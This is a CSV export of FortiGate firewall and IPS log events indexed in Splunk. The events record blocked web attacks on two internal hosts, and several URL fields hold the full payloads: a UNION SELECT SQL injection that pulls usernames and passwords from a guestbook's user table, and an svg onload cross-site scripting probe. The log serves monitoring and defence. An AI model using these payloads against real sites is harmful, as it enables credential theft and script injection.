_raw,_time,action,agent,app,appcat,appid,applist,apprisk,attack,attackid,bytes,bytes_in,bytes_out,category,craction,crlevel,crscore,date,date_hour,date_mday,date_minute,date_month,date_second,date_wday,date_year,date_zone,dest,dest_interface,dest_ip,dest_port,dest_zone,devid,devname,direction,dst_mac,dstcountry,dstintf,dstintfrole,dstip,dstport,dvc,eventtime,eventtype,file_hash,file_name,file_path,ftnt_action,host,hostname,http_referrer,http_user_agent,httpmethod,ids_type,incidentserialno,index,level,linecount,logid,misc,msg,policyid,policytype,poluuid,product,product_version,profile,proto,protocol,protocol_version,ref,rule_id,service,session_id,sessionid,severity,signature,signature_id,site,source,sourcetype,splunk_server,splunk_server_group,src,src_interface,src_ip,src_mac,src_port,src_zone,srccountry,srcintf,srcintfrole,srcip,srcport,subtype,tag,tag::action,tag::app,tag::eventtype,tag::sourcetype,time,timeendpos,timestartpos,transport,type,tz,url,url_domain,vd,vendor,vendor_action,vendor_eventtype,vendor_product,vendor_status,vendor_url
"May 19 08:51:45 mmmcccsfw10.mmm.hhh.ggg date=2026-05-19 time=08:51:46 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779195105929659007 tz=""-0400"" logid=""1059028704"" type=""utm"" subtype=""app-ctrl"" eventtype=""signature"" level=""information"" vd=""root"" appid=34038 srcip=100.27.42.248 srccountry=""United States"" dstip=55.22.11.230 dstcountry=""United States"" srcport=14124 dstport=80 srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccs-dmz"" dstintfrole=""lan"" proto=6 service=""HTTP"" direction=""outgoing"" policyid=592 poluuid=""49c36732-9da4-51ed-cbce-267545a08dd2"" policytype=""policy"" sessionid=2288388378 applist=""block-high-risk"" action=""pass"" appcat=""Web.Client"" app=""HTTP.BROWSER_IE"" hostname=""55.22.11.230"" incidentserialno=578358108 url=""/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201"" agent=""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" httpmethod=""GET"" msg=""Web.Client: HTTP.BROWSER_IE"" apprisk=""medium""",2026-05-19T08:51:45.000-0400,allowed,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),HTTP.BROWSER_IE,Web.Client,34038,block-high-risk,medium,,,,,,Web.Client,,,,5/19/2026,8,19,51,may,45,tuesday,2026,local,55.22.11.230,cccs-dmz,55.22.11.230,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccs-dmz,lan,55.22.11.230,80,mmmcccsfw10,1779195105929659007,ftnt_fortigate ftnt_fortigate_appctrl ftnt_fortigate_utm nix-all-logs,,guestbook.php,55.22.11.230/cgi-bin/guestbook.php,pass,nlmseclog10,55.22.11.230,,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),GET,network,578358108,cccs-nes-fw-perimeter,information,1,1059028704,,Web.Client: HTTP.BROWSER_IE,592,policy,49c36732-9da4-51ed-cbce-267545a08dd2,Firewall,50,,6,ip,ipv4,,592,HTTP,2288388378,2288388378,medium,,,55.22.11.230,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes01,,100.27.42.248,Outside,100.27.42.248,,14124,undefined,United States,Outside,undefined,100.27.42.248,14124,app-ctrl,"communicate
network",,,"communicate
network",,8:51:46,16,0,tcp,utm,-400,"55.22.11.230/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201",,root,Fortinet,pass,signature,Fortinet Firewall,,"/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201"
"May 19 08:51:44 mmmcccsfw10.mmm.hhh.ggg date=2026-05-19 time=08:51:45 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779195105929636725 tz=""-0400"" logid=""0419016384"" type=""utm"" subtype=""ips"" eventtype=""signature"" level=""alert"" vd=""root"" severity=""high"" srcip=100.27.42.248 srccountry=""United States"" dstip=55.22.11.230 dstcountry=""United States"" srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccs-dmz"" dstintfrole=""lan"" sessionid=2288388378 action=""dropped"" proto=6 service=""HTTP"" policyid=592 poluuid=""49c36732-9da4-51ed-cbce-267545a08dd2"" policytype=""policy"" attack=""HTTP.URI.SQL.Injection"" srcport=14124 dstport=80 hostname=""55.22.11.230"" url=""/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201"" agent=""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" httpmethod=""GET"" direction=""outgoing"" attackid=15621 profile=""high_security"" ref=""http://www.fortinet.com/ids/VID15621"" incidentserialno=578358107 msg=""web_misc: HTTP.URI.SQL.Injection"" crscore=30 craction=8192 crlevel=""high""",2026-05-19T08:51:44.000-0400,blocked,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),HTTP,,,,,HTTP.URI.SQL.Injection,15621,,,,HTTP.URI.SQL.Injection,8192,high,30,5/19/2026,8,19,51,may,44,tuesday,2026,local,55.22.11.230,cccs-dmz,55.22.11.230,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccs-dmz,lan,55.22.11.230,80,mmmcccsfw10,1779195105929636725,ftnt_fortigate ftnt_fortigate_ips ftnt_fortigate_utm nix-all-logs,,guestbook.php,55.22.11.230/cgi-bin/guestbook.php,dropped,nlmseclog10,55.22.11.230,,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),GET,network,578358107,cccs-nes-fw-perimeter,alert,1,0419016384,,web_misc: HTTP.URI.SQL.Injection,592,policy,49c36732-9da4-51ed-cbce-267545a08dd2,Firewall,50,high_security,6,ip,ipv4,http://www.fortinet.com/ids/VID15621,592,HTTP,2288388378,2288388378,high,HTTP.URI.SQL.Injection,15621,55.22.11.230,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes01,,100.27.42.248,Outside,100.27.42.248,,14124,undefined,United States,Outside,undefined,100.27.42.248,14124,ips,"attack
ids",,,"attack
ids",,8:51:45,16,0,tcp,utm,-400,"55.22.11.230/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201",,root,Fortinet,dropped,signature,Fortinet Firewall,,"/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201"
"May 18 17:54:11 mmmcccsfw10.mmm.hhh.ggg date=2026-05-18 time=17:54:12 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779141252102033496 tz=""-0400"" logid=""1059028704"" type=""utm"" subtype=""app-ctrl"" eventtype=""signature"" level=""information"" vd=""root"" appid=34050 srcip=34.204.165.207 srccountry=""United States"" dstip=55.22.7.20 dstcountry=""United States"" srcport=56306 dstport=80 srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccc"" dstintfrole=""lan"" proto=6 service=""HTTP"" direction=""outgoing"" policyid=30 poluuid=""ea986204-9d9d-51ed-d07e-9aab576e4da6"" policytype=""policy"" sessionid=2249822827 applist=""block-high-risk"" action=""pass"" appcat=""Web.Client"" app=""HTTP.BROWSER_Firefox"" hostname=""www.st-va.cccc.mmm.hhh.ggg"" incidentserialno=574203195 url=""/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"" agent=""Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16"" httpmethod=""GET"" msg=""Web.Client: HTTP.BROWSER_Firefox"" apprisk=""elevated""",2026-05-18T17:54:11.000-0400,allowed,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,HTTP.BROWSER_Firefox,Web.Client,34050,block-high-risk,elevated,,,,,,Web.Client,,,,5/18/2026,17,18,54,may,11,monday,2026,local,55.22.7.20,cccc,55.22.7.20,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccc,lan,55.22.7.20,80,mmmcccsfw10,1779141252102033496,ftnt_fortigate ftnt_fortigate_appctrl ftnt_fortigate_utm nix-all-logs,,search,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search,pass,nlmseclog10,www.st-va.cccc.mmm.hhh.ggg,,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,GET,network,574203195,cccs-nes-fw-perimeter,information,1,1059028704,,Web.Client: HTTP.BROWSER_Firefox,30,policy,ea986204-9d9d-51ed-d07e-9aab576e4da6,Firewall,50,,6,ip,ipv4,,30,HTTP,2249822827,2249822827,elevated,,,www.st-va.cccc.mmm.hhh.ggg,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes02,,34.204.165.207,Outside,34.204.165.207,,56306,undefined,United States,Outside,undefined,34.204.165.207,56306,app-ctrl,"communicate
network",,,"communicate
network",,17:54:12,16,0,tcp,utm,-400,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E,www.st-va.cccc.mmm.hhh.ggg,root,Fortinet,pass,signature,Fortinet Firewall,,/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
"May 18 17:54:10 mmmcccsfw10.mmm.hhh.ggg date=2026-05-18 time=17:54:12 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779141252102007814 tz=""-0400"" logid=""0419016384"" type=""utm"" subtype=""ips"" eventtype=""signature"" level=""alert"" vd=""root"" severity=""medium"" srcip=34.204.165.207 srccountry=""United States"" dstip=55.22.7.20 dstcountry=""United States"" srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccc"" dstintfrole=""lan"" sessionid=2249822827 action=""dropped"" proto=6 service=""HTTP"" policyid=30 poluuid=""ea986204-9d9d-51ed-d07e-9aab576e4da6"" policytype=""policy"" attack=""Cross.Site.Scripting"" srcport=56306 dstport=80 hostname=""www.st-va.cccc.mmm.hhh.ggg"" url=""/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"" agent=""Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16"" httpmethod=""GET"" direction=""outgoing"" attackid=17702 profile=""high_security"" ref=""http://www.fortinet.com/ids/VID17702"" incidentserialno=574203194 msg=""web_app2: Cross.Site.Scripting"" crscore=10 craction=16384 crlevel=""medium""",2026-05-18T17:54:10.000-0400,blocked,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,HTTP,,,,,Cross.Site.Scripting,17702,,,,Cross.Site.Scripting,16384,medium,10,5/18/2026,17,18,54,may,10,monday,2026,local,55.22.7.20,cccc,55.22.7.20,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccc,lan,55.22.7.20,80,mmmcccsfw10,1779141252102007814,ftnt_fortigate ftnt_fortigate_ips ftnt_fortigate_utm nix-all-logs,,search,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search,dropped,nlmseclog10,www.st-va.cccc.mmm.hhh.ggg,,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,GET,network,574203194,cccs-nes-fw-perimeter,alert,1,0419016384,,web_app2: Cross.Site.Scripting,30,policy,ea986204-9d9d-51ed-d07e-9aab576e4da6,Firewall,50,high_security,6,ip,ipv4,http://www.fortinet.com/ids/VID17702,30,HTTP,2249822827,2249822827,medium,Cross.Site.Scripting,17702,www.st-va.cccc.mmm.hhh.ggg,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes02,,34.204.165.207,Outside,34.204.165.207,,56306,undefined,United States,Outside,undefined,34.204.165.207,56306,ips,"attack
ids",,,"attack
ids",,17:54:12,16,0,tcp,utm,-400,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E,www.st-va.cccc.mmm.hhh.ggg,root,Fortinet,dropped,signature,Fortinet Firewall,,/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
"May 18 17:54:04 mmmcccsfw10.mmm.hhh.ggg date=2026-05-18 time=17:54:06 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779141246100955834 tz=""-0400"" logid=""1059028704"" type=""utm"" subtype=""app-ctrl"" eventtype=""signature"" level=""information"" vd=""root"" appid=34039 srcip=34.204.165.207 srccountry=""United States"" dstip=55.22.7.20 dstcountry=""United States"" srcport=56290 dstport=80 srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccc"" dstintfrole=""lan"" proto=6 service=""HTTP"" direction=""outgoing"" policyid=30 poluuid=""ea986204-9d9d-51ed-d07e-9aab576e4da6"" policytype=""policy"" sessionid=2249819278 applist=""block-high-risk"" action=""pass"" appcat=""Web.Client"" app=""HTTP.BROWSER_Chrome"" hostname=""www-vip.st-va.cccc.mmm.hhh.ggg"" incidentserialno=574202823 url=""/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"" agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"" httpmethod=""GET"" msg=""Web.Client: HTTP.BROWSER_Chrome"" apprisk=""elevated""",2026-05-18T17:54:04.000-0400,allowed,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",HTTP.BROWSER_Chrome,Web.Client,34039,block-high-risk,elevated,,,,,,Web.Client,,,,5/18/2026,17,18,54,may,4,monday,2026,local,55.22.7.20,cccc,55.22.7.20,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccc,lan,55.22.7.20,80,mmmcccsfw10,1779141246100955834,ftnt_fortigate ftnt_fortigate_appctrl ftnt_fortigate_utm nix-all-logs,,search,www-vip.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search,pass,nlmseclog10,www-vip.st-va.cccc.mmm.hhh.ggg,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",GET,network,574202823,cccs-nes-fw-perimeter,information,1,1059028704,,Web.Client: HTTP.BROWSER_Chrome,30,policy,ea986204-9d9d-51ed-d07e-9aab576e4da6,Firewall,50,,6,ip,ipv4,,30,HTTP,2249819278,2249819278,elevated,,,www-vip.st-va.cccc.mmm.hhh.ggg,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes03,,34.204.165.207,Outside,34.204.165.207,,56290,undefined,United States,Outside,undefined,34.204.165.207,56290,app-ctrl,"communicate
network",,,"communicate
network",,17:54:06,16,0,tcp,utm,-400,www-vip.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E,www-vip.st-va.cccc.mmm.hhh.ggg,root,Fortinet,pass,signature,Fortinet Firewall,,/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
"May 18 17:54:04 mmmcccsfw10.mmm.hhh.ggg date=2026-05-18 time=17:54:06 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779141246100925154 tz=""-0400"" logid=""0419016384"" type=""utm"" subtype=""ips"" eventtype=""signature"" level=""alert"" vd=""root"" severity=""medium"" srcip=34.204.165.207 srccountry=""United States"" dstip=55.22.7.20 dstcountry=""United States"" srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccc"" dstintfrole=""lan"" sessionid=2249819278 action=""dropped"" proto=6 service=""HTTP"" policyid=30 poluuid=""ea986204-9d9d-51ed-d07e-9aab576e4da6"" policytype=""policy"" attack=""Cross.Site.Scripting"" srcport=56290 dstport=80 hostname=""www-vip.st-va.cccc.mmm.hhh.ggg"" url=""/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"" agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"" httpmethod=""GET"" direction=""outgoing"" attackid=17702 profile=""high_security"" ref=""http://www.fortinet.com/ids/VID17702"" incidentserialno=574202822 msg=""web_app2: Cross.Site.Scripting"" crscore=10 craction=16384 crlevel=""medium""",2026-05-18T17:54:04.000-0400,blocked,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",HTTP,,,,,Cross.Site.Scripting,17702,,,,Cross.Site.Scripting,16384,medium,10,5/18/2026,17,18,54,may,4,monday,2026,local,55.22.7.20,cccc,55.22.7.20,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccc,lan,55.22.7.20,80,mmmcccsfw10,1779141246100925154,ftnt_fortigate ftnt_fortigate_ips ftnt_fortigate_utm nix-all-logs,,search,www-vip.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search,dropped,nlmseclog10,www-vip.st-va.cccc.mmm.hhh.ggg,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",GET,network,574202822,cccs-nes-fw-perimeter,alert,1,0419016384,,web_app2: Cross.Site.Scripting,30,policy,ea986204-9d9d-51ed-d07e-9aab576e4da6,Firewall,50,high_security,6,ip,ipv4,http://www.fortinet.com/ids/VID17702,30,HTTP,2249819278,2249819278,medium,Cross.Site.Scripting,17702,www-vip.st-va.cccc.mmm.hhh.ggg,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes03,,34.204.165.207,Outside,34.204.165.207,,56290,undefined,United States,Outside,undefined,34.204.165.207,56290,ips,"attack
ids",,,"attack
ids",,17:54:06,16,0,tcp,utm,-400,www-vip.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E,www-vip.st-va.cccc.mmm.hhh.ggg,root,Fortinet,dropped,signature,Fortinet Firewall,,/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
"May 18 17:54:01 mmmcccsfw10.mmm.hhh.ggg date=2026-05-18 time=17:54:02 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779141242095849217 tz=""-0400"" logid=""1059028704"" type=""utm"" subtype=""app-ctrl"" eventtype=""signature"" level=""information"" vd=""root"" appid=34050 srcip=34.204.165.207 srccountry=""United States"" dstip=55.22.7.20 dstcountry=""United States"" srcport=41600 dstport=80 srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccc"" dstintfrole=""lan"" proto=6 service=""HTTP"" direction=""outgoing"" policyid=30 poluuid=""ea986204-9d9d-51ed-d07e-9aab576e4da6"" policytype=""policy"" sessionid=2249816862 applist=""block-high-risk"" action=""pass"" appcat=""Web.Client"" app=""HTTP.BROWSER_Firefox"" hostname=""www.st-va.cccc.mmm.hhh.ggg"" incidentserialno=574202546 url=""/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"" agent=""Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16"" httpmethod=""GET"" msg=""Web.Client: HTTP.BROWSER_Firefox"" apprisk=""elevated""",2026-05-18T17:54:01.000-0400,allowed,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,HTTP.BROWSER_Firefox,Web.Client,34050,block-high-risk,elevated,,,,,,Web.Client,,,,5/18/2026,17,18,54,may,1,monday,2026,local,55.22.7.20,cccc,55.22.7.20,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccc,lan,55.22.7.20,80,mmmcccsfw10,1779141242095849217,ftnt_fortigate ftnt_fortigate_appctrl ftnt_fortigate_utm nix-all-logs,,search,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search,pass,nlmseclog10,www.st-va.cccc.mmm.hhh.ggg,,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,GET,network,574202546,cccs-nes-fw-perimeter,information,1,1059028704,,Web.Client: HTTP.BROWSER_Firefox,30,policy,ea986204-9d9d-51ed-d07e-9aab576e4da6,Firewall,50,,6,ip,ipv4,,30,HTTP,2249816862,2249816862,elevated,,,www.st-va.cccc.mmm.hhh.ggg,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes03,,34.204.165.207,Outside,34.204.165.207,,41600,undefined,United States,Outside,undefined,34.204.165.207,41600,app-ctrl,"communicate
network",,,"communicate
network",,17:54:02,16,0,tcp,utm,-400,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E,www.st-va.cccc.mmm.hhh.ggg,root,Fortinet,pass,signature,Fortinet Firewall,,/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
"May 18 17:54:00 mmmcccsfw10.mmm.hhh.ggg date=2026-05-18 time=17:54:01 devname=""mmmcccsfw10"" devid=""FG22E1T920900134"" eventtime=1779141242095825068 tz=""-0400"" logid=""0419016384"" type=""utm"" subtype=""ips"" eventtype=""signature"" level=""alert"" vd=""root"" severity=""medium"" srcip=34.204.165.207 srccountry=""United States"" dstip=55.22.7.20 dstcountry=""United States"" srcintf=""Outside"" srcintfrole=""undefined"" dstintf=""cccc"" dstintfrole=""lan"" sessionid=2249816862 action=""dropped"" proto=6 service=""HTTP"" policyid=30 poluuid=""ea986204-9d9d-51ed-d07e-9aab576e4da6"" policytype=""policy"" attack=""Cross.Site.Scripting"" srcport=41600 dstport=80 hostname=""www.st-va.cccc.mmm.hhh.ggg"" url=""/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"" agent=""Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16"" httpmethod=""GET"" direction=""outgoing"" attackid=17702 profile=""high_security"" ref=""http://www.fortinet.com/ids/VID17702"" incidentserialno=574202545 msg=""web_app2: Cross.Site.Scripting"" crscore=10 craction=16384 crlevel=""medium""",2026-05-18T17:54:00.000-0400,blocked,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,HTTP,,,,,Cross.Site.Scripting,17702,,,,Cross.Site.Scripting,16384,medium,10,5/18/2026,17,18,54,may,0,monday,2026,local,55.22.7.20,cccc,55.22.7.20,80,lan,FG22E1T920900134,mmmcccsfw10,outgoing,,United States,cccc,lan,55.22.7.20,80,mmmcccsfw10,1779141242095825068,ftnt_fortigate ftnt_fortigate_ips ftnt_fortigate_utm nix-all-logs,,search,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search,dropped,nlmseclog10,www.st-va.cccc.mmm.hhh.ggg,,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16,GET,network,574202545,cccs-nes-fw-perimeter,alert,1,0419016384,,web_app2: Cross.Site.Scripting,30,policy,ea986204-9d9d-51ed-d07e-9aab576e4da6,Firewall,50,high_security,6,ip,ipv4,http://www.fortinet.com/ids/VID17702,30,HTTP,2249816862,2249816862,medium,Cross.Site.Scripting,17702,www.st-va.cccc.mmm.hhh.ggg,/var/log/firewall/cccc-FG-Firewall.log,fortigate_utm,bbbbbsplunkes03,,34.204.165.207,Outside,34.204.165.207,,41600,undefined,United States,Outside,undefined,34.204.165.207,41600,ips,"attack
ids",,,"attack
ids",,17:54:01,16,0,tcp,utm,-400,www.st-va.cccc.mmm.hhh.ggg/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E,www.st-va.cccc.mmm.hhh.ggg,root,Fortinet,dropped,signature,Fortinet Firewall,,/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
